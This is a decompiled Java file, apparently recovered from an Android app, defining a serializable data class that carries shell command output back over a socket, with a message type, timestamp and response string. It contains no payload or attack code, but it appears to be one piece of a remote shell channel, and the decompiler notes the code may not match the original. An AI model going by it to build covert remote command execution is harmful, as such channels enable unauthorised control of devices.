package com.hawkshaw.library.datalayer.models;

import B3.f;
import D3.b;
import E3.q0;
import Y1.K;
import d3.C0393a;
import kotlinx.serialization.KSerializer;
import kotlinx.serialization.descriptors.SerialDescriptor;
import p3.q;
import v3.j;
import w3.w;

@f
public final class SocketCommandResponse {
    /* access modifiers changed from: private */
    public static final KSerializer[] $childSerializers = {j.f("com.hawkshaw.library.datalayer.models.SocketCommandResponse.Type", Type.values()), null, null};
    public static final Companion Companion = new Companion((j3.f) null);
    private final long sentTime;
    private final ShellResponse shellResponse;
    private final Type type;

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(j3.f fVar) {
            this();
        }

        public final KSerializer serializer() {
            return SocketCommandResponse$$serializer.INSTANCE;
        }
    }

    public enum Type {
        Unknown,
        Shell;

        static {
            Type[] $values;
            $ENTRIES = K.J($values);
        }

        public static C0393a getEntries() {
            return $ENTRIES;
        }
    }

    public /* synthetic */ SocketCommandResponse(int i5, Type type2, long j5, ShellResponse shellResponse2, q0 q0Var) {
        if (1 == (i5 & 1)) {
            this.type = type2;
            if ((i5 & 2) == 0) {
                this.sentTime = System.currentTimeMillis();
            } else {
                this.sentTime = j5;
            }
            if ((i5 & 4) == 0) {
                this.shellResponse = null;
            } else {
                this.shellResponse = shellResponse2;
            }
        } else {
            w.x(i5, 1, SocketCommandResponse$$serializer.INSTANCE.getDescriptor());
            throw null;
        }
    }

    public static /* synthetic */ void getSentTime$annotations() {
    }

    public static /* synthetic */ void getShellResponse$annotations() {
    }

    public static /* synthetic */ void getType$annotations() {
    }

    public static final /* synthetic */ void write$Self$library_release(SocketCommandResponse socketCommandResponse, b bVar, SerialDescriptor serialDescriptor) {
        q qVar = (q) bVar;
        qVar.e0(serialDescriptor, 0, $childSerializers[0], socketCommandResponse.type);
        if (qVar.q(serialDescriptor) || socketCommandResponse.sentTime != System.currentTimeMillis()) {
            qVar.d0(serialDescriptor, 1, socketCommandResponse.sentTime);
        }
        if (qVar.q(serialDescriptor) || socketCommandResponse.shellResponse != null) {
            qVar.s(serialDescriptor, 2, SocketCommandResponse$ShellResponse$$serializer.INSTANCE, socketCommandResponse.shellResponse);
        }
    }

    public final long getSentTime() {
        return this.sentTime;
    }

    public final ShellResponse getShellResponse() {
        return this.shellResponse;
    }

    public final Type getType() {
        return this.type;
    }

    @f
    public static final class ShellResponse {
        public static final Companion Companion = new Companion((j3.f) null);
        private final String response;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return SocketCommandResponse$ShellResponse$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ ShellResponse(int i5, String str, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.response = str;
            } else {
                w.x(i5, 1, SocketCommandResponse$ShellResponse$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getResponse$annotations() {
        }

        public final String getResponse() {
            return this.response;
        }

        public ShellResponse(String str) {
            K.n(str, "response");
            this.response = str;
        }
    }

    /* JADX INFO: this call moved to the top of the method (can break code semantics) */
    public /* synthetic */ SocketCommandResponse(Type type2, long j5, ShellResponse shellResponse2, int i5, j3.f fVar) {
        this(type2, (i5 & 2) != 0 ? System.currentTimeMillis() : j5, (i5 & 4) != 0 ? null : shellResponse2);
    }

    public SocketCommandResponse(Type type2, long j5, ShellResponse shellResponse2) {
        K.n(type2, "type");
        this.type = type2;
        this.sentTime = j5;
        this.shellResponse = shellResponse2;
    }
}
